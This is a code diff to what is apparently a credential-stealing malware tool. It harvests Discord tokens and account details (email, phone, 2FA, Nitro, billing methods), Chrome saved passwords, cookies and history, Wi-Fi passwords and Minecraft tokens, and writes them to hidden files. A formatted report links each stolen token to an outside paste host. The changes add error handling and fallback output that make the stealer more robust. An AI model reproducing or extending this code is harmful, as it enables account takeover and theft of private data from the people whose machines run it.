@@ -304,13 +304,16 @@ class grabtokens():
                 methods = "None"
             else:
                 methods = ""
-                for method in b.json():
-                    if method['type'] == 1:
-                        methods += "💳"
-                    elif method['type'] == 0:
-                        methods += "<:paypal:973417655627288666>"
-                    else:
-                        methods += "❓"
+                try:
+                    for method in b.json():
+                        if method['type'] == 1: 
+                            methods += "💳"
+                        elif method['type'] == 2: 
+                            methods += "<:paypal:973417655627288666>"
+                        else: 
+                            methods += "❓"
+                except TypeError: 
+                    methods += "❓"
 
             val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n'
 
@@ -323,10 +326,13 @@ class grabtokens():
             val_codes = []
             if "code" in g.text:
                 codes = json.loads(g.text)
-                for code in codes:
-                    val_codes.append(
-                        (code['code'], code['promotion']['outbound_title']))
-
+                try:
+                    for code in codes:
+                        val_codes.append(
+                            (code['code'], code['promotion']['outbound_title']))
+                except TypeError:
+                    pass
+                    
             if val_codes == []:
                 val += f'\n:gift: **None**\n'
             else:
@@ -405,10 +411,12 @@ class chrome():
                             f.write(
                                 "Username: {:<30} | Password: {:<30} | Site: {:<30}\n".format(
                                     username, password, url))
-
                 cursor.close()
                 conn.close()
                 os.remove("Loginvault.db")
+            else:
+                with open(".\\google-passwords.txt", "w", encoding="utf-8") as f:
+                    f.write("No google passwords were found :(")
 
         hide("google-passwords.txt")
 
@@ -431,10 +439,12 @@ class chrome():
                             f.write(
                                 "Site: {:<30} | Name: {:<30} | Value: {:<30}\n".format(
                                     host, name, value))
-
                 cursor.close()
                 conn.close()
                 os.remove("Cookievault.db")
+            else:
+                with open(".\\google-cookies.txt", "w", encoding="utf-8") as f:
+                    f.write("No google chrome cookies were found :(")
 
         hide("google-cookies.txt")
 
@@ -465,6 +475,9 @@ class chrome():
                 cursor.close()
                 conn.close()
                 os.remove("Historyvault.db")
+            else:
+                with open(".\\google-history.txt", "a", encoding="utf-8") as f:
+                    f.write("No google chrome history was found :(")
 
         hide("google-history.txt")
 
@@ -506,7 +519,7 @@ class grabwifi:
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
 
-@try_extract
+
 class mc_tokens():
     def __init__(self):
         self.roaming = os.getenv("appdata")
